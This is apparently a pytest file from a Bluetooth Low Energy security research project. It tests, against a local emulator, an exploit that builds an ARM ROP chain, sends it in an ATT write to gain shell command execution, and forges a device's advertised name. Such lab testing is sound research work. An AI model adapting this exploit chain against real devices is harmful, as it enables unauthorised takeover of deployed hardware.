import asyncio
import json
import socket
import subprocess
import sys
import time
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parents[2]
sys.path.insert(0, str(ROOT / "research"))

from brunel import emulator, protocol  # noqa: E402
from brunel.rce import arm_rop  # noqa: E402

ACTION = "00001f20-0000-1000-8000-00805f9b34fb"
ROUTE = "00002020-0000-1000-8000-00805f9b34fb"
NAME = "00002a00-0000-1000-8000-00805f9b34fb"


def free_port() -> int:
    with socket.socket() as probe:
        probe.bind(("127.0.0.1", 0))
        return probe.getsockname()[1]


@pytest.fixture(scope="module")
def server(tmp_path_factory):
    state = tmp_path_factory.mktemp("emu")
    port = free_port()
    process = subprocess.Popen(
        [
            sys.executable,
            str(ROOT / "lab/emulator/supervisor.py"),
            "--port", str(port),
            "--state", str(state),
            "--profile", "plain",
            "--recovery-delay", "0.3",
        ],
        stdout=subprocess.PIPE,
        stderr=subprocess.DEVNULL,
        text=True,
    )
    assert process.stdout is not None
    hello = json.loads(process.stdout.readline())
    deadline = time.time() + 10
    while time.time() < deadline:
        try:
            socket.create_connection(("127.0.0.1", port), 0.2).close()
            break
        except OSError:
            time.sleep(0.05)
    yield port, state, hello
    process.terminate()
    process.wait(timeout=5)


@pytest.fixture
def transport(server):
    port, _, _ = server
    return emulator.EmulatorTransport(port=port)


def symbols() -> dict:
    rows = [
        json.loads(line)
        for line in (ROOT / "lab/build/emulator/symbols.jsonl").read_text().splitlines()
        if line
    ]
    return next(row for row in rows if row["name"] == "plain")


def chain(sym: dict, command: str) -> bytes:
    offset = sym["offset"]
    return arm_rop(
        sym["system"],
        sym["gadget"],
        command,
        offset,
        512,
        gadget_words=3,
        system_thumb=False,
        command_addr=sym["command"] + offset + 16,
        shadow_base=sym["command"],
        return_addr=sym["continue"] | 1,
        lr_gadget=sym["gadget_lr"],
    )


@pytest.mark.asyncio
async def test_discovery_and_read(transport):
    await transport.open()
    await transport.connect("78:C4:0E:00:00:00")
    services = await transport.discover()
    uuids = {
        characteristic.uuid
        for service in services
        for characteristic in service.characteristics
    }
    assert ACTION.lower() in uuids
    assert ROUTE.lower() in uuids
    assert b"Heinz" in await transport.read_uuid(ROUTE)
    await transport.close()


@pytest.mark.asyncio
async def test_rce_runs_command_and_survives(transport, server):
    _, state, _ = server
    await transport.open()
    await transport.connect("78:C4:0E:00:00:00")
    handle = await transport.find_handle(ACTION)
    assert handle is not None
    runs = (await transport.status())["runs"]
    await transport.request_mtu(517)
    command = f"/tmp/brunel-emu/sh -c 'echo hit > {state}/pwned'"
    await transport.send_att_command(
        protocol.att_write_command(handle, chain(symbols(), command))
    )
    await asyncio.sleep(0.8)
    assert (state / "pwned").read_text().strip() == "hit"
    assert (await transport.status())["runs"] == runs
    await transport.close()


@pytest.mark.asyncio
async def test_forged_name_reaches_advertisement(transport):
    seen: list[str] = []
    await transport.open()
    await transport.start_scan(lambda adv: seen.append(adv.name or ""))
    await transport.set_state("name", "EVILBUS")
    await asyncio.sleep(1.0)
    await transport.close()
    assert "EVILBUS" in seen


@pytest.mark.asyncio
async def test_shutdown_stops_advertising(transport):
    seen: list[str] = []
    await transport.open()
    await transport.start_scan(lambda adv: seen.append(adv.name or ""))
    await transport.shutdown()
    await asyncio.sleep(0.5)
    seen.clear()
    await asyncio.sleep(1.0)
    assert not seen
    await transport.boot()
    await asyncio.sleep(1.0)
    assert seen
    await transport.close()
